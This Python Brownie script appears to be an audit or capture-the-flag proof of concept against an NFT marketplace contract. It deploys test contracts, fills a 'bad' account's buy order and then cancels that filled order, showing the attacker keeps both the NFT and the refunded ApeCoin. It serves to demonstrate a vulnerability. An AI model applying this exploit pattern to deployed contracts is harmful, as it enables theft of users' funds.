from brownie import NFTMarketplace, HalbornNFT, ApeCoin, accounts


def main():
    ### required accounts
    nft_owner = accounts[0]
    ape_owner = accounts[1]
    market_owner = accounts[2]

    bad = accounts[9]
    victim = accounts[8]

    ### get contract interfaces
    ape_contract = ApeCoin.deploy({"from": ape_owner})

    nft_contract = HalbornNFT.deploy({"from": nft_owner})

    market = NFTMarketplace.deploy(
        market_owner, ape_contract.address, nft_contract.address, {"from": market_owner}
    )

    ### Mint token to nft_owner
    nft_id = 101
    nft_contract.safeMint(nft_owner, nft_id, {"from": nft_owner})

    ### Approve the market place contract as a spender for this token
    nft_contract.approve(market.address, nft_id, {"from": nft_owner})

    ### Mint ApeCoins to bad and victim accounts
    amount = 1000

    ape_contract.mint(bad, amount, {"from": ape_owner})
    ape_contract.mint(victim, amount, {"from": ape_owner})

    ### Approve the market place contract as a spender for these tokens
    ape_contract.approve(market.address, amount, {"from": bad})
    ape_contract.approve(market.address, amount, {"from": victim})

    print("token balance of bad now is: " + str(ape_contract.balanceOf(bad)) + "\n")
    print(
        "token balance of victim now is: " + str(ape_contract.balanceOf(victim)) + "\n"
    )

    ### post 2 separate Buy Orders from bad and victim accounts
    # order id # 0
    market.postBuyOrder(nft_id, amount, {"from": bad})
    # order id # 1
    market.postBuyOrder(nft_id, amount, {"from": victim})

    print("Posted buy orders from bad and victim's accounts\n")

    ### Using nft_owner's account, sell NFT to the bad's buy order
    market.sellToOrderId(0, {"from": nft_owner})
    print("The NFT now is sold to the bad's Buy Order. NFT owner is 'bad' account\n")

    ### cancel order and 'return' amount
    market.cancelBuyOrder(0, {"from": bad})

    print(
        "Token balance of 'bad' account now is: "
        + str(ape_contract.balanceOf(bad))
        + "\n"
    )
    print("The owner of NFT is: " + str(nft_contract.ownerOf(nft_id)) + "\n")
    print("print(bad.adress): " + str(bad.address) + "\n")
